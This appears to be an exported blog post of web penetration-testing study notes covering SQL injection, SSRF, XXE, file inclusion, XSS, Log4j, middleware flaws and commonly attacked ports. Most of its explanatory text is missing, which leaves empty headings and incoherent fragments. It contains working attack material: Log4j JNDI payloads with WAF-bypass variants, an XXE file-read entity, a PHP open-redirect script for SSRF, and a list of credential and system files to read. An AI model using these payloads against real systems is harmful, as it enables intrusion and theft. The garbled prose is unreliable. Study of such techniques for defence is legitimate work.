Reverse TCP shellcode shellcode  Linux  shell \n6. Mac Reverse TCP shellcode shellcode  Mac  shell \n\n\n\n### 2.6379,8009\n\n- 6379redis\n- 8009`Apache-Tomcat-Ajp`tomcatajp8009\n\n\n\n### 3.Cobalt strike shellcode?\n\n\n\n\n\n### 4.Apache \n\n> apacheapachetest.php.abcmime.typeswindowsapache\n\nphpinfo.phpphpinfo.php.abc\n\n\n\n### 5. \n\n\n\n**iis**\n\n\n\n### 6.xxe\n\nphp://filter\n\n\n\n### 7.S2_052\n\n**JBoss /jmx-console/HtmlAdaptor **JMX\n\n\n\n### 8.Weblogic \n\n- **XMLDecoder**\n- **T3**\n- ****\n- ****\n- **IIOP**\n- **SSRF**\n\n\n\n### 9.Jboss \n\n- ****\n- ****\n\n\n\n### 10.Struts2 \n\n- \n\n\n\n### 11.Fastbin \n\n\n\n1.  Fastbin \n2.  glibc  Fastbin \n3.  Fastbin \n4.  glibc  Fastbin \n\n\n\n### 12.Ssrf \n\n**<u></u>**\n\n\n\n### 13.ssrf getpost\n\n\n\n\n\n### 14.Log4j \n\n- **portwafip:port**\n\n  ```\n  ${jndi:ldap:192.168.1.1/a}\n   ${jndi:ldap:192.168.1.1:/a} \n  ldap389\n  \n  ```\n\n  \n\n- **IP**\n\n  ```\n  ${jndi:ldap://[192.168.34.96]/a} \n  ${jndi:ldap://[192.168.34.96]]/a} \n   LdapURL\"[ip]\"LdapCtx[]ip389\n  \n  ```\n\n\n\n### 15.oggphp\n\nOGGPHPPHPPHPPHPfile://http://HTTP\n\n\n\n### 16. Zip://php\n\n`zip://`  PHP 5.2.0  PHP  PHP  ZIP \n\n\n\n### 17..asp\n\n\n\n\n\n### 18.Nginx,apache\n\n\n\n\n\n### 19.Dom xssxss\n\n> DOM  XSS  XSS  XSS  DOM  XSS  DOM \n\n\n\n### 20.Ms17_010\n\n445\n\n\n\n### 21.Sqlmap user-agent\n\n```\n--random-agent\n```\n\n\n\n### 22.Xp_cmdshell \n\n` Microsoft SQL Server `\n\n\n\n### 23.Symlink\n\n\n\n\n\n### 24.Samba wannacry\n\n-  Samba Samba EternalBlue \n-  SMBv1 Samba  SMBv1  WannaCry  SMBv1  Windows  SMBv1 \n-  Windows  SMBv1 \n-  Samba  Samba \n-  Samba ","slug":"web","published":1,"updated":"2024-04-17T08:43:00.791Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7j5000nh7769vf383ka","content":"<h1 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h1><h3 id=\"1-owasp-top-10\"><a href=\"#1-owasp-top-10\" class=\"headerlink\" title=\"1.owasp top 10\"></a>1.owasp top 10</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.SQL</span><br><span class=\"line\">2.</span><br><span class=\"line\">3.XSS</span><br><span class=\"line\">4.</span><br><span class=\"line\">5.</span><br><span class=\"line\">6.</span><br><span class=\"line\">7.</span><br><span class=\"line\">8.CSRF</span><br><span class=\"line\">9.</span><br><span class=\"line\">10.</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-sql\"><a href=\"#2-sql\" class=\"headerlink\" title=\"2.sql\"></a>2.sql</h3><p><strong>sql</strong></p>\n<blockquote>\n<p>SQL</p>\n<p>SQLSQL</p>\n<p>SQL</p>\n</blockquote>\n<p><strong>sql</strong></p>\n<p></p>\n<ul>\n<li></li>\n<li></li>\n</ul>\n<p></p>\n<ul>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ul>\n<p><strong>sql</strong></p>\n<ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<p><strong></strong></p>\n<ul>\n<li>updatexml()</li>\n<li>extractvalue()</li>\n<li>floor()</li>\n</ul>\n<p><strong>sql</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* */%a0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">limitfromoffsetsubstrfrom for</span><br><span class=\"line\">&lt;&gt;greatest()</span><br><span class=\"line\">and=&amp;&amp;  or=||</span><br><span class=\"line\">=   like </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>sql</strong></p>\n<ul>\n<li></li>\n<li></li>\n<li></li>\n</ul>\n<p><strong>Sql server </strong></p>\n<p><a class=\"link\"   href=\"https://zhuanlan.zhihu.com/p/74546690\" >https://zhuanlan.zhihu.com/p/74546690<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h3><p><strong></strong></p>\n<blockquote>\n<p><strong></strong></p>\n</blockquote>\n<p><strong></strong></p>\n<ul>\n<li>js</li>\n<li>(MIME)</li>\n<li></li>\n<li></li>\n</ul>\n<p><strong>()</strong></p>\n<ul>\n<li>.htaccess</li>\n<li>.user.ini</li>\n<li>%00</li>\n</ul>\n<h3 id=\"3-SSRF\"><a href=\"#3-SSRF\" class=\"headerlink\" title=\"3.SSRF\"></a>3.SSRF</h3><blockquote>\n<p> <strong>SSRF</strong>Server-Side Request  Forgery  ssrf  webURL  URLweb  web   SSRFSSRF </p>\n</blockquote>\n<p><strong>ssrf</strong></p>\n<ul>\n<li></li>\n<li></li>\n<li>web</li>\n<li></li>\n<li>file</li>\n</ul>\n<p><strong>Ssrf</strong></p>\n<ul>\n<li>WebHTTPHTTPS</li>\n<li>IP</li>\n<li></li>\n</ul>\n<p><strong>Ssrf</strong></p>\n<ul>\n<li><p>@</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.xxx.com@www.kxsy.work/</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>IP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">120.26.86.156</span><br><span class=\"line\"> = 1111000000110100101011010011100</span><br><span class=\"line\"> = 0x781A569C</span><br><span class=\"line\"> = 2014992028</span><br></pre></td></tr></table></figure>\n</li>\n<li><p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.985.so/</span><br><span class=\"line\">http://www.kxsy.work/ = http://u6.gg/ks69x</span><br></pre></td></tr></table></figure>\n</li>\n<li><p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">http://www.kxsy.work/ = http://wwwkxsywork/</span><br><span class=\"line\">localhost0.0.0.0</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>302</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$schema = $_GET[&#x27;s&#x27;];</span><br><span class=\"line\">$ip     = $_GET[&#x27;i&#x27;];</span><br><span class=\"line\">$port   = $_GET[&#x27;p&#x27;];</span><br><span class=\"line\">$query  = $_GET[&#x27;q&#x27;];</span><br><span class=\"line\">if(empty($port))&#123;  </span><br><span class=\"line\">    header(&quot;Location: $schema://$ip/$query&quot;); </span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    header(&quot;Location: $schema://$ip:$port/$query&quot;); </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>xio.ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://10.0.0.1.xip.io = 10.0.0.1</span><br><span class=\"line\">www.10.0.0.1.xip.io= 10.0.0.1</span><br><span class=\"line\">http://mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class=\"line\">foo.http://bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class=\"line\">10.0.0.1.xip.name resolves to 10.0.0.1</span><br><span class=\"line\">www.10.0.0.2.xip.name resolves to 10.0.0.2</span><br><span class=\"line\">foo.10.0.0.3.xip.name resolves to 10.0.0.3</span><br><span class=\"line\">bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Enclosed alphanumerics</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Enclosed alphanumerics</span><br><span class=\"line\">. &gt;&gt;&gt; http://example.com</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"4-XXE\"><a href=\"#4-XXE\" class=\"headerlink\" title=\"4.XXE\"></a>4.XXE</h3><p><strong>XXE</strong></p>\n<blockquote>\n<p>XXEXML External Entity InjectionXMl</p>\n</blockquote>\n<p>XXExmlxmlDos xxexml</p>\n<p><strong>XXE</strong></p>\n<p>php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$xml=simplexml_load_string($_GET[&#x27;xml&#x27;]);</span><br><span class=\"line\">print_r($xml);</span><br><span class=\"line\">?&gt;\t</span><br></pre></td></tr></table></figure>\n\n<p>xmlURL</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE playwin [</span><br><span class=\"line\">&lt;!ENTITY name SYSTEM &quot;file:///D:/phpStudy/PHPTutorial/WWW/1.txt&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;resume&gt;</span><br><span class=\"line\">&lt;name&gt; &amp;name; &lt;/name&gt;</span><br><span class=\"line\">&lt;/resume&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><strong>Xxe</strong></p>\n<p></p>\n<h3 id=\"5-\"><a href=\"#5-\" class=\"headerlink\" title=\"5.\"></a>5.</h3><p><strong></strong></p>\n<p>php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">require() // </span><br><span class=\"line\"></span><br><span class=\"line\">require_once() // </span><br><span class=\"line\"></span><br><span class=\"line\">include() // </span><br><span class=\"line\"></span><br><span class=\"line\">include_once() // </span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php</span><br><span class=\"line\">php://filter</span><br><span class=\"line\">php://input</span><br><span class=\"line\">file://</span><br><span class=\"line\">phar://</span><br><span class=\"line\">zip://</span><br><span class=\"line\">data://</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong></strong></p>\n<p>getshell</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\boot.ini //</span><br><span class=\"line\">C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS</span><br><span class=\"line\">C:\\Windows\\repair\\sam //</span><br><span class=\"line\">C:\\Program Files\\mysql\\my.ini //Mysql</span><br><span class=\"line\">C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root</span><br><span class=\"line\">C:\\Windows\\php.ini //php</span><br><span class=\"line\">C:\\Windows\\my.ini //Mysql</span><br><span class=\"line\">C:\\Windows\\win.ini //Windows</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"6-Phpphp\"><a href=\"#6-Phpphp\" class=\"headerlink\" title=\"6.Phpphp\"></a>6.Phpphp</h3><p><strong></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assert()</span><br><span class=\"line\">eval()</span><br><span class=\"line\">call_user_func()</span><br><span class=\"line\">call_user_func_array()</span><br><span class=\"line\">preg_replace()  //7.0</span><br><span class=\"line\">array_map()</span><br><span class=\"line\">Usort()</span><br></pre></td></tr></table></figure>\n\n<p><strong></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system()</span><br><span class=\"line\">exec()</span><br><span class=\"line\">passthru()</span><br><span class=\"line\">shell_exec()</span><br><span class=\"line\">poopen()</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"7-XSS\"><a href=\"#7-XSS\" class=\"headerlink\" title=\"7.XSS\"></a>7.XSS</h3><p><strong>XSS</strong></p>\n<blockquote>\n<p>HTML&lt;HTMLHTMLHTMLJavaScriptXSS</p>\n</blockquote>\n<p><strong>xss</strong></p>\n<blockquote>\n<p>1.</p>\n<p> XSS  URL</p>\n<p> URL  XSS  XSS</p>\n<p> XSS  Cookies <br>2.</p>\n<p>XSS</p>\n<p> XSS <br>3.DOM</p>\n<p>DOMXSSweb serverXSS URL  JavaScript  DOM-based XSS  document.URL location.hash location.search document.referrer </p>\n</blockquote>\n<p><strong>Domxssxss</strong></p>\n<p>DOMxssxssJavaScript</p>\n<p><strong>Xss</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.Cookie</span><br><span class=\"line\">2.</span><br><span class=\"line\">3.XSS</span><br><span class=\"line\">4.XSS</span><br><span class=\"line\">5.XSS</span><br><span class=\"line\">6.</span><br><span class=\"line\">7.</span><br><span class=\"line\">8.</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>XSS</strong></p>\n<blockquote>\n<p>1URL()</p>\n<p>&lt;&gt;<br>2HTML</p>\n<p>jshtmlXSS<br><a class=\"link\"   href=\"https://www.cnblogs.com/dearxinli/p/5466286.html\" >https://www.cnblogs.com/dearxinli/p/5466286.html<i class=\"fas fa-external-link-alt\"></i></a><br>3</p>\n<p>HTMLXSS</p>\n</blockquote>\n<h3 id=\"8-\"><a href=\"#8-\" class=\"headerlink\" title=\"8.\"></a>8.</h3><p><strong>Nginx</strong></p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/Spontaneous_0/article/details/129106641\" >https://blog.csdn.net/Spontaneous_0/article/details/129106641<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p><strong>Apache</strong></p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_44174581/article/details/119387616\" >https://blog.csdn.net/weixin_44174581/article/details/119387616<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p><strong>lls</strong></p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_43625577/article/details/91971796\" >https://blog.csdn.net/weixin_43625577/article/details/91971796<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<h3 id=\"9-\"><a href=\"#9-\" class=\"headerlink\" title=\"9.\"></a>9.</h3><p> <strong>Xray</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XSS (key: xss)</span><br><span class=\"line\">SQL  (key: sqldet)</span><br><span class=\"line\">/ (key: cmd-injection)</span><br><span class=\"line\"> (key: dirscan)</span><br><span class=\"line\"> (key: path-traversal)</span><br><span class=\"line\">XML  (key: xxe)</span><br><span class=\"line\"> (key: upload)</span><br><span class=\"line\"> (key: brute-force)</span><br><span class=\"line\">jsonp  (key: jsonp)</span><br><span class=\"line\">ssrf  (key: ssrf)</span><br><span class=\"line\"> (key: baseline)</span><br><span class=\"line\"> (key: redirect)</span><br><span class=\"line\">CRLF  (key: crlf-injection)</span><br><span class=\"line\">Struts2  (key: struts)</span><br><span class=\"line\">Thinkphp (key: thinkphp)</span><br><span class=\"line\">POC  (key: phantasm)</span><br></pre></td></tr></table></figure>\n\n<p>Avws</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.WebScannerWeb</span><br><span class=\"line\">2.Site Crawler</span><br><span class=\"line\">3.Target Finderweb</span><br><span class=\"line\">4.Subdomain ScannerDNS</span><br><span class=\"line\">5.Blind SQL Injector</span><br><span class=\"line\">6.HTTP Editorhttp</span><br><span class=\"line\">7.HTTP SnifferHTTP</span><br><span class=\"line\">8.HTTP Fuzzer</span><br><span class=\"line\">9.Authentication TesterWeb</span><br><span class=\"line\">10.Web Srevice ScannerWeb</span><br><span class=\"line\">11.Web Srevice EditorWeb</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"10-sqlmap\"><a href=\"#10-sqlmap\" class=\"headerlink\" title=\"10.sqlmap\"></a>10.sqlmap</h3><ul>\n<li><code>-v</code> 0python 12debug3payload4http5http7http</li>\n<li><code>-u</code>urlurl <code>?xx=xxx</code> </li>\n<li><code>-r</code>posttxtmsqlmappost</li>\n<li><code>--data=Data</code><code>-u &quot;www.abc.com/index.php?id=1&quot; --data=&quot;name=1&amp;pass=2&quot;</code></li>\n<li><code>--random-agent</code>user-agentsqlmapuser-agent<code>sqlmap/txt/user-agent.txt</code> <strong>level&gt;&#x3D;3user-agent</strong></li>\n<li><code>--os-shell</code>shellmetepreterVNC</li>\n<li><code>--cookie</code>cookie <code>-u &quot;www.abc.com/index.php?id=1&quot;</code></li>\n</ul>\n<h3 id=\"11-\"><a href=\"#11-\" class=\"headerlink\" title=\"11.\"></a>11.</h3><h5 id=\"Tomcat\"><a href=\"#Tomcat\" class=\"headerlink\" title=\"Tomcat\"></a><strong>Tomcat</strong></h5><p></p>\n<p><a class=\"link\"   href=\"https://zhuanlan.zhihu.com/p/137686820\" >https://zhuanlan.zhihu.com/p/137686820<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"iis\"><a href=\"#iis\" class=\"headerlink\" title=\"iis\"></a>iis</h5><p></p>\n<p></p>\n<p></p>\n<p>iis</p>\n<p>PUT</p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_42918771/article/details/105178309\" >https://blog.csdn.net/weixin_42918771/article/details/105178309<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"apache\"><a href=\"#apache\" class=\"headerlink\" title=\"apache\"></a>apache</h5><p>http</p>\n<p></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_44268918/article/details/129129214\" >https://blog.csdn.net/weixin_44268918/article/details/129129214<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>Fastbin</strong></p>\n<p>pwn</p>\n<p><a class=\"link\"   href=\"https://www.freebuf.com/articles/web/263598.html\" >https://www.freebuf.com/articles/web/263598.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"12-Cobalt-strike-mimikatz\"><a href=\"#12-Cobalt-strike-mimikatz\" class=\"headerlink\" title=\"12.Cobalt strike,mimikatz\"></a>12.Cobalt strike,mimikatz</h3><p></p>\n<p><a class=\"link\"   href=\"https://www.freebuf.com/articles/network/290134.html\" >https://www.freebuf.com/articles/network/290134.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"13-\"><a href=\"#13-\" class=\"headerlink\" title=\"13.\"></a>13.</h3><h5 id=\"Jboss\"><a href=\"#Jboss\" class=\"headerlink\" title=\"Jboss\"></a>Jboss</h5><ul>\n<li><strong></strong></li>\n<li><strong></strong></li>\n</ul>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/m0_58434634/article/details/117434173\" >https://blog.csdn.net/m0_58434634/article/details/117434173<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"weblogic\"><a href=\"#weblogic\" class=\"headerlink\" title=\"weblogic\"></a>weblogic</h5><ul>\n<li></li>\n<li></li>\n<li>XML Decoder</li>\n<li>webligic-SSRF</li>\n<li>java</li>\n</ul>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/-mo-/p/11503707.html\" >https://www.cnblogs.com/-mo-/p/11503707.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"thinkphp\"><a href=\"#thinkphp\" class=\"headerlink\" title=\"thinkphp\"></a>thinkphp</h5><ul>\n<li></li>\n</ul>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/lingzhisec/p/15728886.html\" >https://www.cnblogs.com/lingzhisec/p/15728886.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"Struts2\"><a href=\"#Struts2\" class=\"headerlink\" title=\"Struts2\"></a>Struts2</h5><p><a class=\"link\"   href=\"https://blog.csdn.net/HBohan/article/details/122667891\" >https://blog.csdn.net/HBohan/article/details/122667891<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"Shiro\"><a href=\"#Shiro\" class=\"headerlink\" title=\"Shiro\"></a>Shiro</h5><ul>\n<li></li>\n</ul>\n<p><a class=\"link\"   href=\"https://www.freebuf.com/vuls/283810.html\" >https://www.freebuf.com/vuls/283810.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"14-\"><a href=\"#14-\" class=\"headerlink\" title=\"14.\"></a>14.</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">20FTP</span><br><span class=\"line\">21FTP  </span><br><span class=\"line\">22SSH </span><br><span class=\"line\">23Telnet </span><br><span class=\"line\">25SMTP POP3 110</span><br><span class=\"line\">43whois</span><br><span class=\"line\">53DNS(TCP/UDP 53)</span><br><span class=\"line\">67/68DHCP</span><br><span class=\"line\">69TFTP</span><br><span class=\"line\">80HTTPweb</span><br><span class=\"line\">88Kerberos</span><br><span class=\"line\">110POP3SMTP25</span><br><span class=\"line\">135RPC</span><br><span class=\"line\">137/138 NMB</span><br><span class=\"line\">139SMB/CIFS</span><br><span class=\"line\">143IMAP</span><br><span class=\"line\">161/162: Snmppublic</span><br><span class=\"line\">389LDAP</span><br><span class=\"line\">443HTTPSSSL</span><br><span class=\"line\">445SMBMS17-010</span><br><span class=\"line\">512/513/514Linux Rexec</span><br><span class=\"line\">636LDAPS</span><br><span class=\"line\">873Rsync Rsyncrsync </span><br><span class=\"line\">1080socket</span><br><span class=\"line\">1099RMI RMI</span><br><span class=\"line\">1352Lotus domino</span><br><span class=\"line\">1414IBM WebSphere MQ</span><br><span class=\"line\">1433SQL Server</span><br><span class=\"line\">1434SQL ServerTCP/IP</span><br><span class=\"line\">1521oracle</span><br><span class=\"line\">2049NFSNFS</span><br><span class=\"line\">2181ZooKeeper ZooKeeper</span><br><span class=\"line\">2375Docker Docker</span><br><span class=\"line\">2601:   Zebra zebr</span><br><span class=\"line\">3128:   squid )</span><br><span class=\"line\">3268LDAP</span><br><span class=\"line\">3306MySQL </span><br><span class=\"line\">3389Windows   CVE-2019-0708 </span><br><span class=\"line\">3690SVNSVN</span><br><span class=\"line\">4440Rundeckadmin</span><br><span class=\"line\">4560log4j SocketServer log4j&lt;=1.2.17CVE-2019-17571</span><br><span class=\"line\">4750BMC BMCRSCD(CVE-2016-1542)</span><br><span class=\"line\">4848GlassFishadmin/adminadmin</span><br><span class=\"line\">5000SysBase/DB2</span><br><span class=\"line\">5432PostGreSQL</span><br><span class=\"line\">5632PyAnywhere</span><br><span class=\"line\">5900/5901VNC VNC</span><br><span class=\"line\">5984CouchDB CouchDB</span><br><span class=\"line\">6379RedisRedisRedis</span><br><span class=\"line\">7001/7002WeblogicWeblogicWeblogic</span><br><span class=\"line\">7180Cloudera manager</span><br><span class=\"line\">8000JDWPJDWP</span><br><span class=\"line\">8069ZabbixZabbixGetshell</span><br><span class=\"line\">8080TomcatJBossTomcatGetshellJBossTomcatGetshell</span><br><span class=\"line\">8080-8090web</span><br><span class=\"line\">8089JettyJenkins</span><br><span class=\"line\">8161Apache ActiveMQadmin:admin CVE-2016-3088Apache ActiveMQCVE-2016-3088</span><br><span class=\"line\">9000fastcgi</span><br><span 